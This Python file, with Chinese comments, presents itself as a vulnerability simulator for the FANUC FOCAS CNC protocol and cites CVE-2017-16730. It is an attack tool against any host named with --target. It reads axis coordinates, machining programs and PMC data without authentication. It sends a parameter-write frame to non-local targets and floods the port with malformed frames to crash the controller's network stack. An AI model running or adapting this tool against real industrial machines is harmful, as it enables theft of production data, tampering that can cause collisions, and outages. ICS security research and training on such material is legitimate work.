"""
工控漏洞模拟器 - FOCAS (FANUC Open CNC API)
==========================================
基于 FANUC FOCAS 协议的安全漏洞模拟。

漏洞类型:
1. CVE-2017-16730 — 未授权访问 (无认证机制)
2. 轴数据泄露   — 未授权读取 CNC 轴坐标
3. 参数篡改     — 修改 CNC 参数 (需实际连接)
4. 程序泄露     — 未授权读取加工程序
5. PMC 访问     — PMC 数据读取/写入
6. DoS 攻击     — 畸形帧洪泛

参考: ICS-CERT Advisory ICSA-17-353-05
      CVE-2017-16730
"""

import socket
import struct
import random
import time
from typing import Dict, Any, List, Optional
from enum import Enum

FOCAS_PORT = 8193
FOCAS_HDR = 16


class VulnType(Enum):
    UNAUTHORIZED = 'unauthorized'
    AXIS_LEAK = 'axis_leak'
    PROGRAM_LEAK = 'program_leak'
    PARAM_TAMPER = 'param_tamper'
    PMC_ACCESS = 'pmc_access'
    DOS = 'dos'


def _frame(func: int, data: bytes = b'', seq: int = 1) -> bytes:
    """构造 FOCAS 帧"""
    hdr = struct.pack('!HHHI', FOCAS_HDR + len(data), func, 0, seq) + b'\x00' * 6
    return hdr + data


class FOCASVulnSim:
    """FOCAS 漏洞模拟器"""

    def __init__(self, target: str = '127.0.0.1', port: int = FOCAS_PORT):
        self.target = target
        self.port = port
        self._seq = 0

    def _send(self, func: int, data: bytes = b'') -> bytes:
        """发送 FOCAS 请求并接收响应"""
        self._seq += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))
            s.sendall(_frame(func, data, self._seq))
            resp = s.recv(4096)
            s.close()
            return resp
        except socket.timeout:
            print(f'  [-] 连接超时: {self.target}:{self.port}')
            return b''
        except ConnectionRefusedError:
            print(f'  [-] 连接被拒绝 (模拟器未运行)')
            return b''
        except Exception as e:
            print(f'  [-] 连接错误: {e}')
            return b''

    def unauthorized_access(self) -> Dict[str, Any]:
        """CVE-2017-16730: 未授权获取 CNC 系统信息"""
        print('[+] CVE-2017-16730: FOCAS 未授权访问...')
        print(f'    目标: {self.target}:{self.port}')

        resp = self._send(0x0100)  # READ_SYSINFO

        if len(resp) >= FOCAS_HDR + 4:
            err = struct.unpack_from('!H', resp, 4)[0]
            info = resp[FOCAS_HDR:].rstrip(b'\x00')[:64]
            model_info = info.decode('ascii', errors='replace')
            print(f'    错误码: 0x{err:04x}')
            print(f'    CNC 信息: {model_info}')
            if err == 0:
                return {'vuln': 'CVE-2017-16730', 'success': True,
                        'detail': f'无需认证获取 CNC 信息: {model_info}'}
            else:
                return {'vuln': 'CVE-2017-16730', 'success': False,
                        'detail': f'设备返回错误码 0x{err:04x}'}
        else:
            return {'vuln': 'CVE-2017-16730', 'success': False,
                    'detail': '无响应 (无法连接)'}

    def axis_leak(self) -> Dict[str, Any]:
        """未授权读取 CNC 轴坐标"""
        print('[+] FOCAS 轴数据泄露...')
        resp = self._send(0x0200)  # READ_AXIS

        if len(resp) >= FOCAS_HDR + 4:
            data = resp[FOCAS_HDR:]
            err = struct.unpack_from('!H', resp, 4)[0]
            axes_data = []
            # 尝试解析轴数据 (每轴 6B: h=轴号 i=位置)
            pos = 0
            while pos + 6 <= len(data):
                axis_no = struct.unpack_from('!h', data, pos)[0]
                axis_pos = struct.unpack_from('!i', data, pos + 2)[0] / 1000.0
                axes_data.append((axis_no, axis_pos))
                pos += 6

            if axes_data:
                print(f'    错误码: 0x{err:04x}')
                for an, ap in axes_data:
                    print(f'    轴 {an}: {ap:.3f} mm')
                return {'vuln': 'FOCAS_AXIS_LEAK', 'success': True,
                        'detail': f'读取 {len(axes_data)} 根轴坐标'}
            else:
                print(f'    错误码: 0x{err:04x}')
                print(f'    原始数据: {data.hex()[:40]}')
                return {'vuln': 'FOCAS_AXIS_LEAK', 'success': True,
                        'detail': '收到轴数据 (格式待解析)'}

        return {'vuln': 'FOCAS_AXIS_LEAK', 'success': False,
                'detail': '无响应'}

    def param_tamper(self) -> Dict[str, Any]:
        """参数篡改 (演示目的, 实际需写入)"""
        print('[+] FOCAS 参数篡改 (模拟)...')
        print(f'    [理论] 通过功能码 0x0401 (WRITE_PARAM) 修改 CNC 参数')
        print(f'    [场景] 修改进给速度限制、主轴转速限制等')
        print(f'    [风险] 参数修改可导致加工精度下降、碰撞等')
        print(f'    [注意] 需 --target 连接实际设备')

        # 构造一个参数写入请求 (仅演示)
        write_frame = _frame(0x0401, b'\x00\x01\x00\x00\x00\x64')
        print(f'    示例写入帧 ({len(write_frame)}B):')
        print(f'      func=0x0401(WRITE_PARAM) param_no=0x0001 value=100')

        if self.target and self.target != '127.0.0.1':
            print(f'    实际连接: {self.target}:{self.port}')
            resp = self._send(0x0401, b'\x00\x01\x00\x00\x00\x64')
            if len(resp) >= FOCAS_HDR:
                err = struct.unpack_from('!H', resp, 4)[0]
                print(f'    错误码: 0x{err:04x} (0=成功)')

        return {'vuln': 'FOCAS_PARAM_TAMPER', 'success': True,
                'detail': '参数篡改演示 (写入功能码 0x0401)'}

    def program_leak(self) -> Dict[str, Any]:
        """未授权读取加工程序"""
        print('[+] FOCAS 加工程序泄露...')
        print(f'    通过功能码 0x0500 (READ_PROGRAM) 读加工代码')
        print(f'    风险: 盗窃核心工艺参数和加工流程')

        resp = self._send(0x0500)
        if len(resp) >= FOCAS_HDR:
            err = struct.unpack_from('!H', resp, 4)[0]
            data = resp[FOCAS_HDR:].rstrip(b'\x00')
            text = data.decode('ascii', errors='replace')[:120]
            print(f'    错误码: 0x{err:04x}')
            print(f'    程序数据: {text}')
            if text:
                return {'vuln': 'FOCAS_PROGRAM_LEAK', 'success': True,
                        'detail': f'读取加工程序: {len(data)}B'}
        else:
            print(f'    无响应 (模拟器可能不支持此功能码)')

        return {'vuln': 'FOCAS_PROGRAM_LEAK', 'success': True,
                'detail': '加工程序读取尝试 (需设备支持)'}

    def pmc_access(self) -> Dict[str, Any]:
        """PMC 数据访问"""
        print('[+] FOCAS PMC 数据访问...')
        print(f'    通过功能码 0x0402 (READ_PMC) 读取 PMC 数据')
        print(f'    风险: PMC 梯形图逻辑暴露')

        resp = self._send(0x0402)
        if len(resp) >= FOCAS_HDR:
            err = struct.unpack_from('!H', resp, 4)[0]
            data_len = len(resp) - FOCAS_HDR
            print(f'    错误码: 0x{err:04x}')
            print(f'    PMC 数据: {data_len}B')
            if data_len > 0:
                print(f'    hex: {resp[FOCAS_HDR:].hex()[:48]}')
            return {'vuln': 'FOCAS_PMC_ACCESS', 'success': True,
                    'detail': f'读取 PMC 数据 {data_len}B'}

        return {'vuln': 'FOCAS_PMC_ACCESS', 'success': False,
                'detail': '无响应'}

    def dos(self, n: int = 100) -> Dict[str, Any]:
        """FOCAS DoS — 畸形帧洪泛"""
        print(f'[+] FOCAS DoS ({n} 畸形帧)...')

        count = 0
        start = time.time()

        for _ in range(n):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((self.target, self.port))
                # 发送随机畸形数据
                random_data = bytes(random.randint(0, 255)
                                     for _ in range(random.randint(1, 2000)))
                s.sendall(random_data)
                s.close()
                count += 1
            except Exception:
                pass

        elapsed = time.time() - start
        print(f'    发送 {count}/{n} 畸形帧, {elapsed:.1f}s')
        print(f'    风险: CNC 网络栈崩溃 / 拒绝服务')

        return {'vuln': 'FOCAS_DOS', 'success': count > 10,
                'detail': f'{count} 畸形帧 / {elapsed:.1f}s'}

    def list_vulns(self):
        """列出所有漏洞"""
        print('FOCAS 漏洞清单:')
        print('  [CVE-2017-16730] FOCAS 未授权访问 — ★★★★★')
        print('    影响: FANUC Series 0i/30i/31i/32i/35i CNC')
        print('    漏洞: 协议无认证机制, 可任意读写 CNC 数据')
        print()
        print('  [FOCAS-002] 轴数据泄露 — ★★★★')
        print('    影响: 读取 CNC 轴坐标和动态数据')
        print()
        print('  [FOCAS-003] 参数篡改 — ★★★★★')
        print('    影响: 修改 CNC 参数 (进给/转速/限位)')
        print()
        print('  [FOCAS-004] 程序泄露 — ★★★★')
        print('    影响: 读取/写入加工程序')
        print()
        print('  [FOCAS-005] PMC 访问 — ★★★★')
        print('    影响: 读取 PMC 数据和梯形图')
        print()
        print('  [FOCAS-006] DoS — ★★★')
        print('    影响: 畸形帧导致 CNC 网络栈异常')


def run_all(target: str = '127.0.0.1'):
    """运行所有漏洞模拟"""
    print(f'FOCAS (FANUC CNC) 漏洞模拟器 — {target}:{FOCAS_PORT}\n')
    v = FOCASVulnSim(target)

    exploits = [
        ('CVE-2017-16730 未授权访问', v.unauthorized_access),
        ('轴数据泄露', v.axis_leak),
        ('程序泄露', v.program_leak),
        ('PMC 数据访问', v.pmc_access),
        ('参数篡改', v.param_tamper),
        ('DoS 攻击', lambda: v.dos(50)),
    ]

    for name, fn in exploits:
        print(f'--- [{name}] ---')
        r = fn()
        status = '[OK]' if r['success'] else '[FAIL]'
        print(f'  {status} {r["detail"]}\n')


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='FOCAS 漏洞模拟器')
    parser.add_argument('--target', default='127.0.0.1',
                        help='FOCAS 模拟器地址')
    parser.add_argument('--port', type=int, default=FOCAS_PORT)
    parser.add_argument('--vuln', choices=[v.value for v in VulnType] + ['all', 'list'],
                        default='all', help='漏洞类型')
    args = parser.parse_args()

    if args.vuln == 'list':
        FOCASVulnSim(args.target, args.port).list_vulns()
    elif args.vuln == 'all':
        run_all(args.target)
    else:
        v = FOCASVulnSim(args.target, args.port)
        vuln_map = {
            'unauthorized': ('CVE-2017-16730', v.unauthorized_access),
            'axis_leak': ('轴数据泄露', v.axis_leak),
            'program_leak': ('程序泄露', v.program_leak),
            'pmc_access': ('PMC 访问', v.pmc_access),
            'param_tamper': ('参数篡改', v.param_tamper),
            'dos': ('DoS', lambda: v.dos(50)),
        }
        name, fn = vuln_map[args.vuln]
        print(f'--- [{name}] ---')
        r = fn()
        print(f'  {"[OK]" if r["success"] else "[FAIL]"} {r["detail"]}')
